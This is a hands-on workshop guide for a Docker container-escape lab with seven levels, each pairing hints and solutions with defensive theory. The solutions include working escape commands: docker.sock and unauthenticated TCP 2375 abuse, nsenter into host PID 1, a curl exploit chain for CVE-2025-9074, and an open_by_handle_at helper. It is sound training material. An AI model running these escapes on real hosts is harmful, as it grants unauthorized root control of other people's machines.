# Workshop Guide - Escape the Container

In this workshop you break out of seven Docker containers that are started in a
wrong or risky way, and each time you read a secret file that lives on the
"host". The more important part is not the trick itself, but understanding why it
works and how you would stop it.

Levels 1 to 5 are the classic setup mistakes. Levels 6 and 7 are newer and come
from real security problems (CVEs) from 2024 and 2025. There are also a few more
recent ones that are too dangerous to run in a small lab, so we only talk about
them. They are written up in the research part of the
[README](README.md#recent-real-world-container-escape-cves-20242026).

Take your time. Every level has hints that are hidden behind `▸ click to expand`.
Try it yourself first before you open them. The full solutions are also in
[`docs/SOLUTIONS.md`](docs/SOLUTIONS.md), but try them ourself out first, and have fun.

---

## 0. Setup

**Linux / macOS:**
```bash

./lab.sh up          # build and start the lab (first run pulls two images)
./lab.sh levels      # see the 7 escape challenges
./lab.sh enter 1     # go into level 1's container, now escape it
# ...find the flag on the host, then:
./lab.sh submit 1 'ESD26{...}'
./lab.sh down        # stop and wipe everything when you are done
```

**Windows (PowerShell):**
```powershell

.\lab.ps1 up          # build and start the lab (first run pulls two images)
.\lab.ps1 levels      # see the 7 escape challenges
.\lab.ps1 enter 1     # go into level 1's container, now escape it
# ...find the flag on the host, then:
.\lab.ps1 submit 1 'ESD26{...}'
.\lab.ps1 down        # stop and wipe everything when you are done
```
> First time only, if PowerShell blocks the script:
> `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`


The goal is the same for every level:

> You start inside a container. Escape it, read `/flags/levelN.txt` that lives on
> the host, and then run `./lab.sh submit N 'ESD26{...}'`.

You never touch your real laptop. The [README](README.md#is-this-safe-to-run-on-my-laptop)
explains why this is safe.

---

## 1. Theory

Reread it if needed. Same as Workshop, just compacter.

<details><summary> Click to read: what actually separates a container</summary>

A container is not a small computer and not a virtual machine. It is just a
normal program running on the same system as everything else. What makes it
*look* separated is a handful of features from the Linux kernel:

- **Namespaces** - they give the container its own private view of things like
  the running processes, the files, the network and the users. Two programs in
  different namespaces simply do not see the same things.
- **Capabilities** - normally "root" can do everything. Linux splits that power
  into around 40 smaller permissions, and a normal container only keeps a few of
  them.
- **cgroups** - these limit how much CPU, memory and so on a container may use.
- **seccomp and AppArmor/SELinux** - these block certain system calls and
  actions the container should not be allowed to do.

There is no second kernel and nothing like a real wall in between. So every
escape in this lab is basically the same idea:

> Find one spot where the container can reach something on the host that was not
> properly separated (a mounted folder, a socket, a shared namespace, or one
> permission that is too strong), and go through it.

If you keep this picture in your head, every level is just one example of it.
</details>

---

## Level 1 - The folder that was left open
**Problem:** `-v /:/mnt/host:ro`

Someone mounted the whole host filesystem into the container, probably just to
read some config file quickly. Now all the host files are sitting right inside
the container.

```bash
./lab.sh enter 1
```

**Goal:** read `/flags/level1.txt` from the host.

<details><summary> Hint 1</summary>

Look around the filesystem. Is there something mounted that clearly does not
belong to a small Alpine container? Try `ls /` and `mount`.
</details>

<details><summary> Hint 2</summary>

The whole host filesystem is under `/mnt/host`. The flag on the host is at
`/flags/level1.txt`.
</details>

<details><summary> Solution</summary>

```bash
cat /mnt/host/flags/level1.txt
```
</details>

<details><summary> Theory</summary>

If you mount host folders into a container (especially `/`, `/etc`, `/root`,
`/var/run`), you basically give it those files. Only mount what you really need,
make it read-only, and never mount sensitive folders.
</details>

---

## Level 2 - The key to everything
**Problem:** `-v /var/run/docker.sock:/var/run/docker.sock`

The Docker socket is mounted into the container. This socket is the control
channel of the Docker engine. If you can talk to it, you can basically do
anything Docker can do, which means you are as powerful as root on the host. For
example, you can ask Docker to start a new container that mounts the whole host.

```bash
./lab.sh enter 2
```

**Goal:** read `/flags/level2.txt` from the host.

<details><summary> Hint 1</summary>

`ls -l /var/run/docker.sock` - it is here. The `docker` command is already
installed in this container. What can you do when you can control a Docker engine?
</details>

<details><summary> Hint 2</summary>

You can start a **new** container and pick its mounts yourself. What if that new
container mounts the host `/` and just reads the flag?
</details>

<details><summary> Solution</summary>

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/host vuln:latest \
  cat /host/flags/level2.txt
```
You used the host's own Docker engine to start a container that mounts the host
root. This is the classic `docker.sock` escape.
</details>

<details><summary> Theory</summary>

Mounting `docker.sock` is the same as giving out host root. CI systems do this
very often. Better options are rootless runners, a socket proxy with a strict
allow-list, or simply not mounting it.
</details>

---

## Level 3 - Knocking from the network
**Problem:** the host's Docker engine listens on TCP port `2375` without any
login or password.

This is the same power as Level 2, but you reach it over the network instead of
through a mounted file. Leaving port `2375` open (or `2376` without proper TLS) is
one of the most common Docker mistakes in the real world. Scanners like Shodan
find thousands of these open on the internet.

```bash
./lab.sh enter 3     # here you start as a normal 'player' user, not root
```

**Goal:** read `/flags/level3.txt` from the host.

<details><summary> Hint 1</summary>

Nothing useful is mounted this time, so think about the network. Who is the host,
seen from inside a container? Try `ip route`. The `default` gateway is the host.
</details>

<details><summary> Hint 2</summary>

The Docker API is on the host at port `2375`. The `docker` command can talk to a
remote engine with `-H tcp://<host>:2375`. After that it is the same as Level 2.
</details>

<details><summary> Solution</summary>

```bash
GW=$(ip route | awk '/default/{print $3}')      # the host's IP
docker -H tcp://$GW:2375 run --rm -v /:/host vuln:latest \
  cat /host/flags/level3.txt
```
</details>

<details><summary> Theory</summary>

Never put the Docker API on an open TCP port without TLS and client certificates.
If you really need remote access, firewall it and require certificates. An open
`2375` is instant remote root.
</details>

---

## Level 4 - Privileged means no walls at all
**Problem:** `--privileged --pid=host`

`--privileged` gives the container all capabilities and turns off most of the
protection. `--pid=host` puts the container into the same process space as the
host, so it can see and also enter the host processes. Together there is
basically no separation left.

```bash
./lab.sh enter 4
```

**Goal:** read `/flags/level4.txt` from the host.

<details><summary> Hint 1</summary>

Run `ps aux`. You can see the host processes, including **PID 1**. That is
unusual, because normally a container only sees its own processes.
</details>

<details><summary> Hint 2</summary>

If you can see host process 1 and you also have the permissions, you can jump
into its namespaces. Look at the `nsenter` command. Entering the namespaces of
PID 1 puts you on the host filesystem.
</details>

<details><summary> Solution</summary>

```bash
nsenter -t 1 -m -u -i -n -p -- cat /flags/level4.txt
# or get a full host shell:
nsenter -t 1 -m -u -i -n -p -- bash
```
`nsenter -t 1` means "join the namespaces of PID 1". The letters `-m -u -i -n -p`
are the different namespaces (mount, UTS, IPC, network, PID). After that you are
basically running on the host.
</details>

<details><summary> Theory</summary>

`--privileged` is almost never really needed, and it switches off the protection
completely. Together with `--pid=host` it is game over. Check your setups for both
of these.
</details>

---

## Level 5 - You do not even need `--privileged`
**Problem:** `--cap-add=SYS_ADMIN --cap-add=SYS_PTRACE --pid=host`
(important: there is **no** `--privileged` here, and seccomp is still on)

Many people think "I did not use `--privileged`, so I am safe". This level shows
that this is not true. Two extra permissions plus the shared process space are
already enough to do the same thing as Level 4. The `--privileged` label was
never really the point, the single permissions are what matters.

```bash
./lab.sh enter 5
```

**Goal:** read `/flags/level5.txt` from the host.

<details><summary> Hint 1</summary>

This one looks locked down, and `docker inspect` would say it is not privileged.
But check your permissions with `capsh --print` (or `grep Cap /proc/self/status`).
You have `SYS_ADMIN` and `SYS_PTRACE`, and you share the host process space.
</details>

<details><summary> Hint 2</summary>

`SYS_ADMIN` lets you jump into other mount namespaces, and `SYS_PTRACE` lets you
look into other processes. That is exactly what `nsenter` needs, so the Level 4
command works here too.
</details>

<details><summary> Solution</summary>

```bash
nsenter -t 1 -m -u -i -n -p -- cat /flags/level5.txt
```
Same escape as Level 4, but only with two permissions and no `--privileged`.
</details>

<details><summary> Theory</summary>

Add capabilities one by one and only when really needed. `SYS_ADMIN` is so strong
that people call it "the new root". Drop all of them by default (`--cap-drop=ALL`)
and add back only what the app really uses.
</details>

---

## Level 6 - The platform's own back door
**Problem:** nothing that *you* did wrong. The Docker engine API was reachable
from inside the container without any login. This is a real bug: **CVE-2025-9074**
in Docker Desktop, from August 2025, with a very high score of 9.3.

This is the scary one. If you run `docker inspect` on this container, everything
looks fine: no `--privileged`, no mounted socket, no shared namespaces, no extra
permissions, and you are even a normal user and not root. The container itself is
completely normal.

```bash
./lab.sh enter 6     # you start as the normal 'player' user
```

**Goal:** read `/flags/level6.txt` from the host.

<details><summary> Hint 1</summary>

This time you have no socket and no mounts, and you are not even root. But
something is listening on the network. Who is the host from in here? `ip route`
again gives you the `default` gateway. Try the Docker API port on it:
`curl -s http://<gateway>:2375/version`.
</details>

<details><summary> Hint 2</summary>

The engine API answers you without asking for any login. You do not even need the
`docker` command (the real attacker only had a way to send HTTP requests). Two
simple HTTP `POST`s are the whole attack: `/containers/create` with a mount of
`/`, then `/containers/{id}/start`. Then read the container's logs to see the
output.
</details>

<details><summary> Solution</summary>

Close to the real proof of concept, with plain HTTP and no Docker command:
```bash
GW=$(ip route | awk '/default/{print $3}')      # the host
API="http://$GW:2375"

# 1) create a container that mounts the host root and reads the flag
cid=$(curl -s -XPOST "$API/containers/create" -H 'Content-Type: application/json' \
  -d '{"Image":"vuln:latest","Cmd":["cat","/host/flags/level6.txt"],
       "HostConfig":{"Binds":["/:/host:ro"]}}' | jq -r .Id)

# 2) start it, 3) read its logs (the flag is in there, after a small 8-byte header)
curl -s -XPOST "$API/containers/$cid/start"
sleep 1
curl -s "$API/containers/$cid/logs?stdout=1&stderr=1" | strings
```
(If you prefer the short way: `docker -H tcp://$GW:2375 run --rm -v /:/host vuln:latest cat /host/flags/level6.txt` does the same thing with the Docker command.)
</details>

<details><summary> Theory</summary>

In the real bug, *any* container on Docker Desktop could reach the engine API at
`192.168.65.7:2375` without any login. So a single line of `curl` in a hacked web
app (for example through an
[SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery), which
is when you trick a server into making requests for you) was enough to take over
the whole host. It even worked when "Enhanced Container Isolation" was turned on.

The engine API is as powerful as root, and a well-hardened container does not help
you at all if the platform makes that API reachable. Keep Docker Desktop and the
engine updated (this was fixed in 4.44.3), never bind the API to an address that
others can reach, and remember: "the container had no permissions" is not a
defence when the control channel is open. See
[Recent real-world CVEs](README.md#recent-real-world-container-escape-cves-20242026).
</details>

---

## Level 7 - One permission is already enough
**Problem:** `--cap-drop=ALL --cap-add=DAC_READ_SEARCH` plus one small read-only
mount (`-v /srv/level7/share:/share:ro`).

Here someone tried to do it the "right" way: drop all permissions, add back only
one read-only permission, and mount only one harmless app folder. That should be
safe, right? The flag sits on the same small data disk as `/share`, just outside
the part you were given.

```bash
./lab.sh enter 7
```

**Goal:** read `/flags/level7.txt` from the host. For this level it was copied onto
the app's data disk as `secret.txt`, right next to your `/share` mount but outside
of it.

<details><summary> Hint 1</summary>

Check what you are allowed to do: `capsh --print` (or `grep Cap /proc/self/status`).
You have exactly one permission: `dac_read_search`. The special thing about it is
not only "read any file", it is also the key that makes the `open_by_handle_at`
call allowed. Look at what is mounted: only `/share`. The file you want is not
under `/share`.
</details>

<details><summary> Hint 2</summary>

A file "handle" is basically just a small number for a file on a disk. The root
folder of an ext2/3/4 disk always has the number 2. So if you can open even one
spot on the data disk (`/share` counts), you can ask the kernel for the root of
that disk (number 2) and then walk to `secret.txt` by name. There is a small
helper tool in the image: `handle-read`. Run it with no arguments and it does
exactly this.
</details>

<details><summary> Solution</summary>

```bash
# The image has a small ~40-line helper for this (see lab/vulnerable/handle_reader.c).
# Defaults: anchor=/share, target=secret.txt, inode=2 (ext4 root), generation=0.
handle-read

# the same thing written out:
handle-read /share secret.txt 2 0
```
The helper opens the root of the data disk directly by its number (2), even
though only the subfolder `/share` was mounted in. From there it just opens
`secret.txt` by name. The kernel only allows all of this because we have
`CAP_DAC_READ_SEARCH`.
</details>

<details><summary> Theory</summary>

The permission `CAP_DAC_READ_SEARCH` lets you ignore the normal file read checks.
On top of that it unlocks a special system call called `open_by_handle_at`. We
will be honest, the full details of this call are a bit much for us, but the
important part is simple: it can open a file directly by its number on the disk,
without caring in which folder it is or whether that folder was mounted into your
container.

So a single permission is not automatically "small". `DAC_READ_SEARCH` turns one
read-only mount into read access to the whole disk behind it. This is the old and
well-known "shocker" trick. So give permissions only by real need, keep untrusted
data on its own separate disk, and treat `DAC_READ_SEARCH`, `DAC_OVERRIDE` and
`SYS_ADMIN` as almost the same as root.
</details>

---

## One more thing: the escapes we could not show here

Besides Level 6 and 7, there are a few escapes and recent CVEs that are more
dangerous and that we cannot really run in a small lab like this, because they
would need a broken runtime on purpose, or they would reach the real machine. They
are still worth knowing, so we wrote up what they do and how they look in the
research part of the README:

➡ **[Recent CVEs and the escapes we only discuss](README.md#recent-real-world-container-escape-cves-20242026)**

---

## Wrap-up: the one thing to remember

> A container is only as separated as the options you start it with.
> The same image was a prison or an open door, depending only on `docker run`.

### Defensive checklist
- `--cap-drop=ALL` and add back the minimum. Never `--privileged` unless you
  really must.
- Do not mount `docker.sock`, `/`, or other sensitive host paths.
- Never put the Docker API on an open TCP port without login, and keep **Docker
  Desktop/engine updated** so the platform does not open it for you (Level 6 /
  CVE-2025-9074).
- **Update `runc` quickly** and **only build and run images you trust**. The
  runtime gets its own bugs too (Leaky Vessels, the November 2025 runc group). See
  [the README](README.md#recent-real-world-container-escape-cves-20242026).
- Use rootless Docker or user namespaces where you can, and keep seccomp and
  AppArmor **on**.
- Keep untrusted data on its own separate disk (Level 7), so one read permission
  cannot reach everything.
- For untrusted or multi-tenant workloads, think about gVisor or Kata.
- Watch at runtime with Falco/Tetragon, and check your configs with
  `docker-bench-security` or Trivy.

When you are done, run `./lab.sh down` and give your brain and laptop a rest.
